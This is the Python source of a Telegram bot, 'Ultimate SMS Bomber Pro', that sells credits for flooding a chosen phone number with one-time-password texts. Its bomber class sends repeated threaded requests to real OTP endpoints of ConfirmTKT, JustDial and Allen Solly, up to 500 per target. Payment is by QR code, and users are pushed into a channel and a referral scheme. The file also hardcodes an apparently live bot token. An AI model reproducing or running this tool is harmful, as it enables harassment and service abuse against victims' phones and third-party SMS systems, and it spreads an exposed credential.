import logging
import sqlite3
import requests
import threading
import asyncio
import time
import random
from telegram import (
    Update, 
    InlineKeyboardButton, 
    InlineKeyboardMarkup,
    InputMediaPhoto
)
from telegram.ext import (
    Application, 
    CommandHandler, 
    MessageHandler, 
    filters, 
    ContextTypes,
    CallbackQueryHandler,
    ConversationHandler
)

# Bot configuration
BOT_TOKEN = "8386048836:AAHwJuBXUudmwYqiybtYFgPJX1YYIA3D0AI"
ADMIN_ID = 6847499628

# Force subscription channel
CHANNEL_USERNAME = "@EscrowMoon"
CHANNEL_ID = -1002699957030

# Payment QR code - Direct image URL
PAYMENT_QR_URL = "https://i.postimg.cc/qBXmX2pP/IMG-20251115-190606-343.jpg"

# Credit packages
CREDIT_PACKAGES = {
    "100": {"credits": 100, "price": 10},
    "250": {"credits": 250, "price": 20},
    "500": {"credits": 500, "price": 40},
    "1000": {"credits": 1000, "price": 80},
    "2000": {"credits": 2000, "price": 150}
}

# Bombing options
BOMB_OPTIONS = {
    "10": 10,
    "50": 50, 
    "100": 100,
    "200": 200,
    "300": 300,
    "400": 400,
    "500": 500
}

# Conversation states
WAITING_UTR, WAITING_PHONE = range(2)

# Setup logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

# Database setup
def init_db():
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            credits INTEGER DEFAULT 30,
            referrals INTEGER DEFAULT 0,
            referred_by INTEGER DEFAULT NULL,
            is_premium INTEGER DEFAULT 0,
            is_admin INTEGER DEFAULT 0,
            join_date DATETIME DEFAULT CURRENT_TIMESTAMP,
            is_verified INTEGER DEFAULT 0
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS payments (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            package TEXT,
            amount REAL,
            credits INTEGER,
            utr TEXT,
            status TEXT DEFAULT 'pending',
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    # Add admin user
    cursor.execute('INSERT OR IGNORE INTO users (user_id, username, first_name, credits, is_admin, is_verified) VALUES (?, ?, ?, ?, ?, ?)',
                  (ADMIN_ID, "Owner", "Admin", 999999, 1, 1))
    
    conn.commit()
    conn.close()

def get_user(user_id):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
    user = cursor.fetchone()
    conn.close()
    return user

def update_user(user_id, username, first_name):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute('''
        INSERT OR REPLACE INTO users (user_id, username, first_name, credits, referrals, referred_by, is_premium, is_admin, is_verified)
        VALUES (?, ?, ?, COALESCE((SELECT credits FROM users WHERE user_id = ?), 30), 
                COALESCE((SELECT referrals FROM users WHERE user_id = ?), 0),
                COALESCE((SELECT referred_by FROM users WHERE user_id = ?), NULL),
                COALESCE((SELECT is_premium FROM users WHERE user_id = ?), 0),
                COALESCE((SELECT is_admin FROM users WHERE user_id = ?), 0),
                COALESCE((SELECT is_verified FROM users WHERE user_id = ?), 0))
    ''', (user_id, username, first_name, user_id, user_id, user_id, user_id, user_id, user_id))
    conn.commit()
    conn.close()

def mark_verified(user_id):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute('UPDATE users SET is_verified = 1 WHERE user_id = ?', (user_id,))
    conn.commit()
    conn.close()

def update_credits(user_id, credits):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute('UPDATE users SET credits = credits + ? WHERE user_id = ?', (credits, user_id))
    conn.commit()
    conn.close()

def add_referral(referrer_id):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute('UPDATE users SET referrals = referrals + 1, credits = credits + 25 WHERE user_id = ?', (referrer_id,))
    conn.commit()
    conn.close()

def add_payment(user_id, package, amount, credits, utr):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute('INSERT INTO payments (user_id, package, amount, credits, utr) VALUES (?, ?, ?, ?, ?)',
                  (user_id, package, amount, credits, utr))
    conn.commit()
    conn.close()

def get_all_users():
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM users')
    users = cursor.fetchall()
    conn.close()
    return users

def get_total_users():
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute('SELECT COUNT(*) FROM users')
    count = cursor.fetchone()[0]
    conn.close()
    return count

def get_total_credits():
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute('SELECT SUM(credits) FROM users')
    total = cursor.fetchone()[0] or 0
    conn.close()
    return total

def get_total_referrals():
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute('SELECT SUM(referrals) FROM users')
    total = cursor.fetchone()[0] or 0
    conn.close()
    return total

def is_admin(user_id):
    user = get_user(user_id)
    return user and user[7] == 1

def is_verified(user_id):
    user = get_user(user_id)
    return user and user[9] == 1

# Enhanced SMS Bomber Class
class UltimateSMSBomber:
    def __init__(self, phone_number, country_code="91", message_count=10):
        self.phone = phone_number
        self.country_code = country_code
        self.message_count = message_count
        self.user_agent = "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36"
        self.active = True
        self.success_count = 0
        self.fail_count = 0
        self.sent_count = 0
        self.api_stats = {}
        self.lock = threading.Lock()
        self.apis = self._load_all_apis()
    
    def _load_all_apis(self):
        apis = [
            {
                "name": "ConfirmTKT",
                "method": "GET",
                "url": "https://securedapi.confirmtkt.com/api/platform/register",
                "params": {"newOtp": "true", "mobileNumber": self.phone},
                "identifier": "false"
            },
            {
                "name": "JustDial",
                "method": "GET",
                "url": "https://t.justdial.com/api/india_api_write/18july2018/sendvcode.php",
                "params": {"mobile": self.phone},
                "identifier": "sent"
            },
            {
                "name": "Allen Solly",
                "method": "POST",
                "url": "https://www.allensolly.com/capillarylogin/validateMobileOrEMail",
                "data": {"mobileoremail": self.phone, "name": "markluther"},
                "identifier": "true"
            }
        ]
        return apis
    
    def _send_request(self, api):
        try:
            url = api["url"]
            
            headers = {
                "User-Agent": self.user_agent,
                **api.get("headers", {})
            }
            
            if api["method"] == "POST":
                if "json" in api:
                    response = requests.post(url, json=api["json"], headers=headers, timeout=10)
                else:
                    response = requests.post(url, data=api.get("data", {}), headers=headers, timeout=10)
            else:
                response = requests.get(url, params=api.get("params", {}), headers=headers, timeout=10)
            
            identifier = api.get("identifier", "")
            success = False
            
            if identifier:
                if identifier.isdigit():
                    success = str(response.status_code) == identifier
                else:
                    success = identifier.lower() in str(response.text).lower()
            else:
                success = response.status_code == 200
            
            with self.lock:
                if success:
                    self.success_count += 1
                    self.api_stats[api["name"]] = self.api_stats.get(api["name"], 0) + 1
                else:
                    self.fail_count += 1
                self.sent_count += 1
            
            return success
            
        except Exception as e:
            with self.lock:
                self.fail_count += 1
                self.sent_count += 1
            return False
    
    def start_bombing(self):
        self.active = True
        self.sent_count = 0
        
        def bomb_worker():
            while self.active and self.sent_count < self.message_count:
                random.shuffle(self.apis)
                for api in self.apis:
                    if not self.active or self.sent_count >= self.message_count:
                        break
                    self._send_request(api)
                    time.sleep(0.5)
        
        thread = threading.Thread(target=bomb_worker)
        thread.daemon = True
        thread.start()
        
        return f"🚀 SMS bombing started on +{self.country_code}{self.phone}\n📨 Target: {self.message_count} messages"
    
    def stop_bombing(self):
        self.active = False
        return f"""
🛑 Bombing Stopped!

📊 Results:
✅ Success: {self.success_count}
❌ Failed: {self.fail_count}
📨 Sent: {self.sent_count}
🎯 Target: {self.message_count}
"""

    def get_progress(self):
        return {
            "success": self.success_count,
            "failed": self.fail_count,
            "sent": self.sent_count,
            "target": self.message_count,
            "active": self.active
        }

# Bot Functions
async def check_subscription(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if is_admin(user_id) or is_verified(user_id):
        return True
    
    try:
        member = await context.bot.get_chat_member(CHANNEL_ID, user_id)
        if member.status in ['left', 'kicked']:
            return False
        return True
    except Exception as e:
        logging.error(f"Subscription check error: {e}")
        return False

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username
    first_name = update.effective_user.first_name
    
    update_user(user_id, username, first_name)
    
    referred_by = None
    if context.args:
        try:
            referred_by = int(context.args[0])
            if referred_by != user_id:
                user_data = get_user(user_id)
                if user_data and not user_data[5]:
                    add_referral(referred_by)
                    conn = sqlite3.connect('users.db')
                    cursor = conn.cursor()
                    cursor.execute('UPDATE users SET referred_by = ? WHERE user_id = ?', (referred_by, user_id))
                    conn.commit()
                    conn.close()
        except ValueError:
            pass
    
    if is_verified(user_id):
        await show_main_menu(update, context)
        return
    
    welcome_text = f"""
👋 **Welcome {first_name}!**

🤖 **Ultimate SMS Bomber Pro**

🔒 **To access this bot, you need to:**
1. Join our official channel
2. Click the verify button

✨ **Features you'll get:**
• 🚀 Advanced SMS Bombing
• 💳 Credit System  
• 👥 Referral Program
• 🔒 Secure & Fast

📢 **Channel:** {CHANNEL_USERNAME}
"""
    
    keyboard = [
        [InlineKeyboardButton("🌙 Team Moon", url=f"https://t.me/{CHANNEL_USERNAME[1:]}")],
        [InlineKeyboardButton("🔐 Verify", callback_data="verify_subscription")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if update.message:
        await update.message.reply_text(welcome_text, reply_markup=reply_markup, parse_mode='Markdown')
    else:
        await update.callback_query.edit_message_text(welcome_text, reply_markup=reply_markup, parse_mode='Markdown')

async def verify_subscription(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    
    if await check_subscription(update, context):
        mark_verified(user_id)
        await query.edit_message_text("✅ Verification successful! Loading main menu...")
        await show_main_menu(update, context)
    else:
        await query.answer("❌ Please join the channel first! Click 'Team Moon' to join.", show_alert=True)

async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user = get_user(user_id)
    
    welcome_text = f"""
🎉 **Welcome {user[2]}!**

🤖 **Ultimate SMS Bomber Pro**

✨ **Available Features:**
• 🚀 Advanced SMS Bombing
• 💳 Credit System (1 Credit = 1 SMS)
• 👥 Referral Program
• 🔒 Secure & Fast

💎 **Your Credits:** {user[3]}
👥 **Your Referrals:** {user[4]}

Choose an option below:
"""
    
    keyboard = [
        [InlineKeyboardButton("👤 Account", callback_data="account"),
         InlineKeyboardButton("👥 Referral", callback_data="referral")],
        [InlineKeyboardButton("💳 Buy Credit", callback_data="buy_credit"),
         InlineKeyboardButton("🚀 Start Bombing", callback_data="bomb_menu")],
        [InlineKeyboardButton("📞 Contact Admin", url="https://t.me/HelpLuffyBot")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if update.callback_query:
        await update.callback_query.edit_message_text(welcome_text, reply_markup=reply_markup, parse_mode='Markdown')
    else:
        await update.message.reply_text(welcome_text, reply_markup=reply_markup, parse_mode='Markdown')

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    
    if not is_verified(user_id):
        await start(update, context)
        return
    
    if query.data == "account":
        user = get_user(user_id)
        if user:
            premium_status = "🌟 Premium" if user[6] else "⚡ Regular"
            account_text = f"""
👤 **Account Information**

🆔 **User ID:** `{user[0]}`
📛 **Name:** {user[2]}
💳 **Credits:** {user[3]}
👥 **Referrals:** {user[4]}
🎯 **Status:** {premium_status}
📅 **Member Since:** {user[8][:10]}
"""
            await query.edit_message_text(account_text, parse_mode='Markdown')
    
    elif query.data == "referral":
        user = get_user(user_id)
        bot_username = (await context.bot.get_me()).username
        referral_link = f"https://t.me/{bot_username}?start={user_id}"
        
        referral_text = f"""
👥 **Referral System**

🔗 **Your Referral Link:**
`{referral_link}`

💰 **Referral Bonus:**
• 25 credits per successful referral
• Unlimited earning potential

📊 **Your Stats:**
• Total Referrals: {user[4]}
• Earned Credits: {user[4] * 25}

🎯 **How it works:**
1. Share your referral link
2. When someone joins using your link
3. You get 25 credits instantly!
"""
        await query.edit_message_text(referral_text, parse_mode='Markdown')
    
    elif query.data == "buy_credit":
        keyboard = []
        for package, details in CREDIT_PACKAGES.items():
            button_text = f"💰 {details['credits']} Credits - ₹{details['price']}"
            keyboard.append([InlineKeyboardButton(button_text, callback_data=f"package_{package}")])
        keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="main_menu")])
        
        credit_text = """
💳 **Buy Credits**

🎯 **Credit Packages:**
• 1 Credit = 1 SMS
• Instant delivery
• 24/7 support

📦 **Available Packages:"""
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(credit_text, reply_markup=reply_markup, parse_mode='Markdown')
    
    elif query.data == "bomb_menu":
        user = get_user(user_id)
        if user[3] <= 0:
            await query.answer("❌ Insufficient credits! Please buy more credits.", show_alert=True)
            return
        
        bomb_text = f"""
🚀 **SMS Bombing Menu**

💳 **Your Credits:** {user[3]}
📨 **1 Credit = 1 SMS**

**Select number of messages to send:**
"""
        keyboard = []
        row = []
        for count, value in BOMB_OPTIONS.items():
            if value <= user[3]:
                row.append(InlineKeyboardButton(f"📨 {count}", callback_data=f"bomb_{count}"))
                if len(row) == 2:
                    keyboard.append(row)
                    row = []
        if row:
            keyboard.append(row)
        
        keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="main_menu")])
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(bomb_text, reply_markup=reply_markup, parse_mode='Markdown')
    
    elif query.data.startswith("bomb_"):
        message_count = query.data.split("_")[1]
        count_value = BOMB_OPTIONS[message_count]
        user = get_user(user_id)
        
        if user[3] < count_value:
            await query.answer("❌ Insufficient credits!", show_alert=True)
            return
        
        context.user_data['bomb_count'] = count_value
        bomb_text = f"""
🎯 **Bombing Setup**

📨 **Messages to send:** {count_value}
💳 **Credits required:** {count_value}
💎 **Your credits:** {user[3]}

📱 **Please send the target number in format:**
`country_code phone_number`

**Example:**
`91 9876543210`
"""
        await query.edit_message_text(bomb_text, parse_mode='Markdown')
        return WAITING_PHONE
    
    elif query.data.startswith("package_"):
        package = query.data.split("_")[1]
        details = CREDIT_PACKAGES[package]
        
        # Send QR code as image
        try:
            await context.bot.send_photo(
                chat_id=query.message.chat_id,
                photo=PAYMENT_QR_URL,
                caption=f"""
💳 **Payment Details**

📦 **Package:** {details['credits']} Credits
💰 **Amount:** ₹{details['price']}
🎯 **Rate:** 1 Credit = 1 SMS

**Payment Instructions:**
1. Scan the QR code above
2. Pay exactly ₹{details['price']}
3. Click 'Confirm Payment'
4. Send your UTR Number

💡 **Note:** Payments are verified manually within 1 hour.
""",
                parse_mode='Markdown'
            )
        except Exception as e:
            logging.error(f"Error sending QR image: {e}")
            payment_text = f"""
💳 **Payment Details**

📦 **Package:** {details['credits']} Credits
💰 **Amount:** ₹{details['price']}
🎯 **Rate:** 1 Credit = 1 SMS

📸 **Payment QR Code:**
{PAYMENT_QR_URL}

**Payment Instructions:**
1. Scan the QR code above
2. Pay exactly ₹{details['price']}
3. Click 'Confirm Payment'
4. Send your UTR Number
"""
            await query.edit_message_text(payment_text, parse_mode='Markdown')
        
        keyboard = [
            [InlineKeyboardButton("✅ Confirm Payment", callback_data=f"confirm_{package}")],
            [InlineKeyboardButton("❌ Cancel", callback_data="buy_credit")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text("Click the button below after scanning QR:", reply_markup=reply_markup)
    
    elif query.data.startswith("confirm_"):
        package = query.data.split("_")[1]
        details = CREDIT_PACKAGES[package]
        context.user_data['pending_payment'] = package
        
        confirm_text = f"""
✅ **Payment Confirmation**

📦 **Package:** {details['credits']} Credits
💰 **Amount:** ₹{details['price']}

📝 **Please send your UTR Number:**
(Transaction Reference Number)

💡 **You can find UTR in your bank statement or payment app.**
"""
        
        await query.edit_message_text(confirm_text, parse_mode='Markdown')
        return WAITING_UTR
    
    elif query.data == "main_menu":
        await show_main_menu(update, context)
    
    elif query.data == "stop_bombing":
        if 'bomber' in context.user_data:
            bomber = context.user_data['bomber']
            result = bomber.stop_bombing()
            await query.edit_message_text(result, parse_mode='Markdown')
        else:
            await query.answer("❌ No active bombing session!", show_alert=True)

async def handle_phone_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()
    
    if not is_verified(user_id):
        await start(update, context)
        return ConversationHandler.END
    
    bomb_count = context.user_data.get('bomb_count', 10)
    user = get_user(user_id)
    
    if user[3] < bomb_count:
        await update.message.reply_text("❌ Insufficient credits! Please buy more credits.")
        return ConversationHandler.END
    
    try:
        if ' ' in text:
            country_code, phone = text.split(' ', 1)
            country_code = country_code.strip()
            phone = phone.strip()
            
            if not (country_code.isdigit() and phone.isdigit()):
                await update.message.reply_text("❌ Invalid phone number format. Use numbers only.")
                return WAITING_PHONE
                
        else:
            await update.message.reply_text("❌ Invalid format. Use: `91 9876543210`", parse_mode='Markdown')
            return WAITING_PHONE
        
        # Deduct credits
        update_credits(user_id, -bomb_count)
        
        # Start bombing
        bomber = UltimateSMSBomber(phone, country_code, bomb_count)
        context.user_data['bomber'] = bomber
        start_result = bomber.start_bombing()
        
        bombing_text = f"""
{start_result}

⏳ **Status:** Running...
🛑 **Stop:** Click button below to stop

📊 **Progress:**
✅ Success: 0
❌ Failed: 0  
📨 Sent: 0/{bomb_count}
"""
        keyboard = [[InlineKeyboardButton("🛑 Stop Bombing", callback_data="stop_bombing")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        progress_msg = await update.message.reply_text(bombing_text, reply_markup=reply_markup, parse_mode='Markdown')
        
        # Start progress monitoring
        asyncio.create_task(monitor_bombing_progress(update, context, bomber, progress_msg.message_id))
        
        return ConversationHandler.END
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")
        return ConversationHandler.END

async def monitor_bombing_progress(update: Update, context: ContextTypes.DEFAULT_TYPE, bomber, message_id):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    
    max_attempts = 50
    attempts = 0
    
    while bomber.active and bomber.sent_count < bomber.message_count and attempts < max_attempts:
        try:
            progress = bomber.get_progress()
            progress_text = f"""
🚀 **Bombing in Progress...**

📱 **Target:** +{bomber.country_code}{bomber.phone}
📨 **Messages:** {progress['sent']}/{bomber.message_count}

📊 **Progress:**
✅ Success: {progress['success']}
❌ Failed: {progress['failed']}
⚡ Success Rate: {(progress['success']/max(progress['sent'],1))*100:.1f}%

🛑 Click below to stop bombing
"""
            keyboard = [[InlineKeyboardButton("🛑 Stop Bombing", callback_data="stop_bombing")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await context.bot.edit_message_text(
                chat_id=chat_id,
                message_id=message_id,
                text=progress_text,
                reply_markup=reply_markup,
                parse_mode='Markdown'
            )
            
            await asyncio.sleep(3)
            attempts += 1
            
        except Exception as e:
            break
    
    # Final update
    if bomber.sent_count >= bomber.message_count:
        final_text = f"""
🎉 **Bombing Completed!**

📱 **Target:** +{bomber.country_code}{bomber.phone}
📨 **Messages Sent:** {bomber.message_count}

📊 **Final Results:**
✅ Success: {bomber.success_count}
❌ Failed: {bomber.fail_count}
⚡ Success Rate: {(bomber.success_count/max(bomber.message_count,1))*100:.1f}%

💎 **Credits used:** {bomber.message_count}
"""
        try:
            await context.bot.edit_message_text(
                chat_id=chat_id,
                message_id=message_id,
                text=final_text,
                parse_mode='Markdown'
            )
        except:
            pass

async def handle_utr(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    utr = update.message.text.strip()
    package = context.user_data.get('pending_payment')
    
    if not package:
        await update.message.reply_text("❌ No pending payment found. Please start over.")
        return ConversationHandler.END
    
    details = CREDIT_PACKAGES[package]
    
    add_payment(user_id, package, details['price'], details['credits'], utr)
    
    user = get_user(user_id)
    
    # Notify admin
    admin_text = f"""
💰 **New Payment Request**

👤 **User:** {user[2]} (@{user[1]})
🆔 **User ID:** `{user_id}`
📦 **Package:** {details['credits']} credits
💰 **Amount:** ₹{details['price']}
🔢 **UTR:** `{utr}`

⚠️ **Please verify payment manually**
"""
    
    try:
        await context.bot.send_message(ADMIN_ID, admin_text, parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Failed to notify admin: {e}")
    
    # Notify user
    user_text = f"""
✅ **Payment Received**

📦 **Package:** {details['credits']} Credits
💰 **Amount:** ₹{details['price']}
🔢 **UTR:** `{utr}`

⏳ **Status:** Under Verification
🕐 **Time:** Usually within 1 hour

📞 **For Help:** @HelpLuffyBot

Thank you for your payment! Your credits will be added soon.
"""
    
    await update.message.reply_text(user_text, parse_mode='Markdown')
    return ConversationHandler.END

# Admin Commands
async def add_credit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin access required.")
        return
    
    if len(context.args) != 2:
        await update.message.reply_text("Usage: /addcredit <user_id> <amount>")
        return
    
    try:
        target_user = int(context.args[0])
        amount = int(context.args[1])
        
        update_credits(target_user, amount)
        target = get_user(target_user)
        
        await update.message.reply_text(f"✅ Added {amount} credits to user {target[2]} (@{target[1]})")
        
        try:
            await context.bot.send_message(target_user, f"🎉 You received {amount} credits from admin!")
        except:
            pass
            
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID or amount.")

async def minus_credit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin access required.")
        return
    
    if len(context.args) != 2:
        await update.message.reply_text("Usage: /minuscredit <user_id> <amount>")
        return
    
    try:
        target_user = int(context.args[0])
        amount = int(context.args[1])
        
        update_credits(target_user, -amount)
        target = get_user(target_user)
        
        await update.message.reply_text(f"✅ Deducted {amount} credits from user {target[2]} (@{target[1]})")
            
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID or amount.")

async def user_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin access required.")
        return
    
    if not context.args:
        await update.message.reply_text("Usage: /info <user_id or username>")
        return
    
    search_term = context.args[0]
    
    try:
        if search_term.startswith('@'):
            conn = sqlite3.connect('users.db')
            cursor = conn.cursor()
            cursor.execute('SELECT * FROM users WHERE username = ?', (search_term[1:],))
            target = cursor.fetchone()
            conn.close()
        else:
            target = get_user(int(search_term))
        
        if not target:
            await update.message.reply_text("❌ User not found.")
            return
        
        premium_status = "Premium" if target[6] else "Regular"
        admin_status = "Yes" if target[7] else "No"
        verified_status = "Yes" if target[9] else "No"
        
        info_text = f"""
👤 **User Information**

🆔 **User ID:** `{target[0]}`
📛 **Username:** @{target[1]}
👤 **Name:** {target[2]}
💳 **Credits:** {target[3]}
👥 **Referrals:** {target[4]}
👑 **Admin:** {admin_status}
🎯 **Premium:** {premium_status}
✅ **Verified:** {verified_status}
📅 **Joined:** {target[8][:10]}
"""
        await update.message.reply_text(info_text, parse_mode='Markdown')
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def add_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin access required.")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /addadmin <user_id>")
        return
    
    try:
        new_admin = int(context.args[0])
        conn = sqlite3.connect('users.db')
        cursor = conn.cursor()
        cursor.execute('UPDATE users SET is_admin = 1 WHERE user_id = ?', (new_admin,))
        conn.commit()
        conn.close()
        
        await update.message.reply_text(f"✅ User {new_admin} added as admin.")
        
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID.")

async def remove_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin access required.")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /removeadmin <user_id>")
        return
    
    try:
        target_admin = int(context.args[0])
        if target_admin == ADMIN_ID:
            await update.message.reply_text("❌ Cannot remove main admin.")
            return
            
        conn = sqlite3.connect('users.db')
        cursor = conn.cursor()
        cursor.execute('UPDATE users SET is_admin = 0 WHERE user_id = ?', (target_admin,))
        conn.commit()
        conn.close()
        
        await update.message.reply_text(f"✅ User {target_admin} removed from admin.")
        
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID.")

async def statics(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin access required.")
        return
    
    total_users = get_total_users()
    total_credits = get_total_credits()
    total_referrals = get_total_referrals()
    
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute('SELECT COUNT(*) FROM users WHERE is_admin = 1')
    admin_count = cursor.fetchone()[0]
    conn.close()
    
    stats_text = f"""
📊 **Bot Statistics**

👥 **Total Users:** {total_users}
💳 **Total Credits:** {total_credits}
👥 **Total Referrals:** {total_referrals}
👑 **Total Admins:** {admin_count}
"""
    await update.message.reply_text(stats_text, parse_mode='Markdown')

async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin access required.")
        return
    
    if not context.args:
        await update.message.reply_text("Usage: /broadcast <message>")
        return
    
    message = ' '.join(context.args)
    all_users = get_all_users()
    
    success_count = 0
    fail_count = 0
    
    for user in all_users:
        try:
            await context.bot.send_message(
                user[0],
                f"📢 **Broadcast Message**\n\n{message}\n\n_From Admin_",
                parse_mode='Markdown'
            )
            success_count += 1
        except Exception:
            fail_count += 1
    
    await update.message.reply_text(
        f"📊 **Broadcast Results**\n\n"
        f"✅ Success: {success_count}\n"
        f"❌ Failed: {fail_count}"
    )

async def getalluser(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin access required.")
        return
    
    all_users = get_all_users()
    
    if not all_users:
        await update.message.reply_text("❌ No users found.")
        return
    
    user_list = "👥 **All Users List**\n\n"
    
    for user in all_users[:20]:
        user_list += f"🆔 {user[0]} | 👤 {user[2]} | 💳 {user[3]} credits\n"
    
    if len(all_users) > 20:
        user_list += f"\n... and {len(all_users) - 20} more users"
    
    await update.message.reply_text(user_list, parse_mode='Markdown')

async def lostalluser(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin access required.")
        return
    
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute('DELETE FROM users WHERE user_id != ?', (ADMIN_ID,))
    cursor.execute('DELETE FROM payments')
    conn.commit()
    conn.close()
    
    await update.message.reply_text("✅ All users data cleared (except admin).")

async def ban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin access required.")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /ban <user_id>")
        return
    
    try:
        target_user = int(context.args[0])
        update_credits(target_user, -get_user(target_user)[3])
        await update.message.reply_text(f"✅ User {target_user} banned (credits set to 0).")
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID.")

async def unban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin access required.")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /unban <user_id>")
        return
    
    try:
        target_user = int(context.args[0])
        update_credits(target_user, 30)
        await update.message.reply_text(f"✅ User {target_user} unbanned (30 credits restored).")
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID.")

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Operation cancelled.")
    return ConversationHandler.END

def main():
    # Initialize database
    init_db()
    
    # Create application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add conversation handlers
    payment_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(button_handler, pattern='^confirm_')],
        states={WAITING_UTR: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_utr)]},
        fallbacks=[CommandHandler('cancel', cancel)],
        per_message=False
    )
    
    bomb_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(button_handler, pattern='^bomb_')],
        states={WAITING_PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_phone_number)]},
        fallbacks=[CommandHandler('cancel', cancel)],
        per_message=False
    )
    
    # Add handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("addcredit", add_credit))
    application.add_handler(CommandHandler("minuscredit", minus_credit))
    application.add_handler(CommandHandler("info", user_info))
    application.add_handler(CommandHandler("addadmin", add_admin))
    application.add_handler(CommandHandler("removeadmin", remove_admin))
    application.add_handler(CommandHandler("statics", statics))
    application.add_handler(CommandHandler("broadcast", broadcast))
    application.add_handler(CommandHandler("getalluser", getalluser))
    application.add_handler(CommandHandler("lostalluser", lostalluser))
    application.add_handler(CommandHandler("ban", ban_user))
    application.add_handler(CommandHandler("unban", unban_user))
    
    application.add_handler(CallbackQueryHandler(verify_subscription, pattern='^verify_subscription$'))
    application.add_handler(CallbackQueryHandler(button_handler))
    
    application.add_handler(payment_conv)
    application.add_handler(bomb_conv)
    
    # Start bot
    print("🤖 Bot is running...")
    application.run_polling()

if __name__ == '__main__':
    main()
